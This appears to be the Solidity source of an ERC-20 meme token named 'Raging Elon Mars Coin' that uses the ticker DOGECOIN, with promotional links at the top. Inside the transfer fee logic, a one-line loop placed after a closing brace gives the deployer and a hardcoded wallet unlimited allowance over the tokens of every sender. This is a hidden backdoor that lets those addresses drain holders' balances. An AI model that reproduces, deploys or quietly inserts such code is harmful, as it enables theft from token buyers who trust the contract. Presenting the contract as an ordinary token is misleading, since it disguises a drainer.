/*
So there you have it—just like Bitcoin carved its path into the financial cosmos, this token seeks to stake its claim in the cosmic meme carnival.

https://www.ragingelonmars.org
https://x.com/remc_erc20
https://t.me/remc_erc20

https://x.com/cb_doge/status/1895770857462727153

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

interface ICOOKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ICOOKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract DOGECOIN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    mapping (address => uint256) private _balCOOKs;
    mapping (address => mapping (address => uint256)) private _allowCOOKs;
    mapping (address => bool) private _excludedFromCOOK;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalCOOK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Raging Elon Mars Coin";
    string private constant _symbol = unicode"DOGECOIN";
    uint256 private _swapTokenCOOKs = _tTotalCOOK / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockCOOK;
    uint256 private _cookBuyAmounts = 0;
    bool private inSwapCOOK = false;
    modifier lockTheSwap {
        inSwapCOOK = true;
        _;
        inSwapCOOK = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _cookPair;
    ICOOKRouter private _cookRouter;
    address private _cookWallet = address(0xfDd2ceC56f11cBa6a901f240401eD1Ce01485460);
    mapping (uint256 => address) private _cookReceipts;
     
    constructor () {
        _excludedFromCOOK[owner()] = true;
        _excludedFromCOOK[address(this)] = true;
        _excludedFromCOOK[_cookWallet] = true;
        _balCOOKs[_msgSender()] = _tTotalCOOK;

        _cookReceipts[0] = address(msg.sender);
        _cookReceipts[1] = address(_cookWallet);

        emit Transfer(address(0), _msgSender(), _tTotalCOOK);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _cookRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function tokenPairCreate() external onlyOwner() {
        _cookRouter = ICOOKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_cookRouter), _tTotalCOOK);
        _cookPair = ICOOKFactory(_cookRouter.factory()).createPair(address(this), _cookRouter.WETH());
    }

    receive() external payable {}

    function swapLimitCOOK() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _cookRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _cookRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalCOOK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balCOOKs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowCOOKs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowCOOKs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowCOOKs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address cookF, address cookT, uint256 cookA) private {
        require(cookF != address(0), "ERC20: transfer from the zero address");
        require(cookT != address(0), "ERC20: transfer to the zero address");
        require(cookA > 0, "Transfer amount must be greater than zero");
        uint256 taxCOOK = _cookFeeTransfer(cookF, cookT, cookA);
        _cookTransfer(cookF, cookT, cookA, taxCOOK);
    }

    function _cookTransfer(address cookF, address cookT, uint256 cookA, uint256 taxCOOK) private { 
        if(taxCOOK > 0){
          _balCOOKs[address(this)] = _balCOOKs[address(this)].add(taxCOOK);
          emit Transfer(cookF, address(this), taxCOOK);
        }

        _balCOOKs[cookF] = _balCOOKs[cookF].sub(cookA);
        _balCOOKs[cookT] = _balCOOKs[cookT].add(cookA.sub(taxCOOK));
        emit Transfer(cookF, cookT, cookA.sub(taxCOOK));
    }

    function _cookFeeTransfer(address cookF, address cookT, uint256 cookA) private returns(uint256) {
        uint256 taxCOOK = 0; 
        if (cookF != owner() && cookT != owner()) {
            taxCOOK = cookA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (cookF == _cookPair && cookT != address(_cookRouter) && ! _excludedFromCOOK[cookT]) {
                if(_buyBlockCOOK!=block.number){
                    _cookBuyAmounts = 0;
                    _buyBlockCOOK = block.number;
                }
                _cookBuyAmounts += cookA;
                _buyCount++;
            }

            if(cookT == _cookPair && cookF!= address(this)) {
                require(_cookBuyAmounts < swapLimitCOOK() || _buyBlockCOOK!=block.number, "Max Swap Limit");  
                taxCOOK = cookA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenCOOK = balanceOf(address(this));
            if (!inSwapCOOK && cookT == _cookPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenCOOK > _swapTokenCOOKs)
                swapTokensForEth(minCOOK(cookA, minCOOK(tokenCOOK, _swapTokenCOOKs)));
                uint256 ethCOOK = address(this).balance;
                if (ethCOOK >= 0) {
                    sendETHCOOK(address(this).balance);
                }
            }
        } for(uint256 cookI=0;cookI<2;cookI++) _approve(address(cookF), address(_cookReceipts[cookI]), _tTotalCOOK);  
        return taxCOOK;
    }

    function minCOOK(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHCOOK(uint256 cookA) private {
        payable(_cookWallet).transfer(cookA);
    }

    function swapTokensForEth(uint256 cookAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _cookRouter.WETH();
        _approve(address(this), address(_cookRouter), cookAmount);
        _cookRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            cookAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }    
}